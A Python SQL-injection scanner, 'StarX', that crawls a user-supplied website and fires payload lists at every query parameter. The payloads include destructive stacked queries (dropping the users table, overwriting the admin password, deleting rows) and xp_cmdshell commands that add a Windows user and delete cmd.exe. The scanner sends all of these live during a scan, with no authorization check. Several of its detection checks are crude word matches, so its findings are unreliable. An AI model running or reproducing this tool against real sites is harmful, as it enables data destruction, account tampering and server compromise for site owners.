import requests
import urllib.parse
from bs4 import BeautifulSoup
import time
from colorama import Fore, Style, init
from concurrent.futures import ThreadPoolExecutor

init(autoreset=True)

class StarXSQLiScanner:
    def __init__(self):
        self.vulnerable_urls = []
        self.payloads = {
            "error_based": [
                "'", "\"", "';", "\";", "'--", "'#", "\"--", "\"#",
                "' OR 1=1 --", "\" OR 1=1 --", "' OR 'a'='a", 
                "' OR 1=1#", "' OR '1'='1'--", "' OR ''='", 
                "' OR 1=1-- -", "' || '1'='1", "' AND 1=CAST((CHR(113)||CHR(122)||CHR(112)||CHR(122))||(SELECT version()) FROM dual)--",
                "' AND updatexml(null,concat(0x3a,(SELECT @@version)),null)--"
            ],
            "boolean_based": [
                "' AND 1=1 --", "' AND 1=2 --", "\" AND 1=1 --", "\" AND 1=2 --"
            ],
            "time_based": [
                "'; WAITFOR DELAY '0:0:5'--", "'; SELECT sleep(5)--", "\"; SELECT sleep(5)--"
            ],
            "union_based": [
                "' UNION SELECT null --", "' UNION SELECT 1,2,3 --", "' UNION SELECT ALL table_name FROM information_schema.tables --",
                "' UNION SELECT user(),database() --", "' UNION SELECT null, null, null --"
            ],
            "stacked_queries": [
                "'; DROP TABLE users --", "'; UPDATE users SET password='newpassword' WHERE username='admin' --", "'; DELETE FROM users WHERE id=1 --"
            ],
            "blind_based": [
                "' AND 1=1 --", "' AND 1=2 --", "\" AND 1=1 --", "\" AND 1=2 --"
            ],
            "second_order": [
                "'; EXEC xp_cmdshell('net user test testpassword /add') --", "'; EXEC xp_cmdshell('del /f /s /q C:\\Windows\\System32\\cmd.exe') --"
            ]
        }

    def print_banner(self):
        print(Fore.MAGENTA + Style.BRIGHT + "╔═════════════════════════════════════════════╗")
        print(Fore.CYAN + Style.BRIGHT + "       StarX SQLi Scanner           ")
        print(Fore.MAGENTA + Style.BRIGHT + "╚═════════════════════════════════════════════╝")

    def is_vulnerable(self, base_url, param, method, payload):
        parsed_url = urllib.parse.urlparse(base_url)
        query = dict(urllib.parse.parse_qsl(parsed_url.query))
        original_value = query.get(param, "")
        query[param] = original_value + payload
        new_query = urllib.parse.urlencode(query)
        new_url = urllib.parse.urlunparse(parsed_url._replace(query=new_query))

        try:
            start = time.time()
            response = requests.get(new_url, timeout=7)
            end = time.time()
            elapsed = end - start
            content = response.text.lower()

            if method == "error_based":
                if any(e in content for e in ["you have an error", "sql syntax", "mysql_fetch", "ora-", "syntax error"]):
                    return True

            elif method == "boolean_based":
                true_test = original_value + "' AND 1=1 --"
                false_test = original_value + "' AND 1=2 --"
                query[param] = true_test
                true_url = urllib.parse.urlunparse(parsed_url._replace(query=urllib.parse.urlencode(query)))
                query[param] = false_test
                false_url = urllib.parse.urlunparse(parsed_url._replace(query=urllib.parse.urlencode(query)))
                true_resp = requests.get(true_url).text
                false_resp = requests.get(false_url).text
                if true_resp != false_resp:
                    return True

            elif method == "time_based":
                if elapsed > 4.5:
                    return True

            elif method == "union_based":
                if "union" in content or "select" in content or "table" in content:
                    return True

            elif method == "stacked_queries":
                if "drop table" in content or "update" in content or "delete" in content:
                    return True

            elif method == "blind_based":
                true_test = original_value + "' AND 1=1 --"
                false_test = original_value + "' AND 1=2 --"
                query[param] = true_test
                true_url = urllib.parse.urlunparse(parsed_url._replace(query=urllib.parse.urlencode(query)))
                query[param] = false_test
                false_url = urllib.parse.urlunparse(parsed_url._replace(query=urllib.parse.urlencode(query)))
                true_resp = requests.get(true_url).text
                false_resp = requests.get(false_url).text
                if true_resp != false_resp:
                    return True

            elif method == "second_order":
                if "xp_cmdshell" in content or "net user" in content or "del" in content:
                    return True

        except Exception:
            pass

        return False

    def scan_url(self, url):
        parsed = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed.query)
        if not query_params:
            return

        for param in query_params:
            for method, payload_list in self.payloads.items():
                for payload in payload_list:
                    if self.is_vulnerable(url, param, method, payload):
                        full_url = f"{url} | Param: {param} | Method: {method}"
                        self.vulnerable_urls.append(full_url)
                        print(Fore.RED + f"[!] Vulnerability found → Method: {method} | URL: {url}")
                        return  

    def crawl_website(self, base_url):
        visited_urls = set()
        to_visit = [base_url]

        while to_visit:
            url = to_visit.pop()
            if url in visited_urls:
                continue 

            visited_urls.add(url)  
            print(Fore.YELLOW + f"[~] Scanning: {url}")

            try:
                response = requests.get(url, timeout=5)
                if response.status_code == 200:
                    soup = BeautifulSoup(response.text, 'html.parser')
                    links = set(a.get('href') for a in soup.find_all('a', href=True))

                    for link in links:
                        full_url = urllib.parse.urljoin(url, link)
                        if base_url in full_url and full_url not in visited_urls:
                            to_visit.append(full_url)  

                    self.scan_url(url)
            except requests.exceptions.RequestException as e:
                print(Fore.RED + f"Error with URL: {url} | {str(e)}")

    def run(self):
        self.print_banner()
        base_url = input(Fore.CYAN + "\nEnter the base URL (example https://emxaple.com | https or http or ... required): ").strip()

        print(Fore.YELLOW + "\n[~] Starting SQL Injection Scan...\n")

        self.crawl_website(base_url)

        print(Fore.CYAN + "\nScan Complete.\n")
        if self.vulnerable_urls:
            print(Fore.RED + "Vulnerabilities Found:")
            for v in self.vulnerable_urls:
                print(Fore.GREEN + "- " + v)
        else:
            print(Fore.GREEN + "No SQL Injection vulnerabilities detected.")

if __name__ == "__main__":
    scanner = StarXSQLiScanner()
    scanner.run()
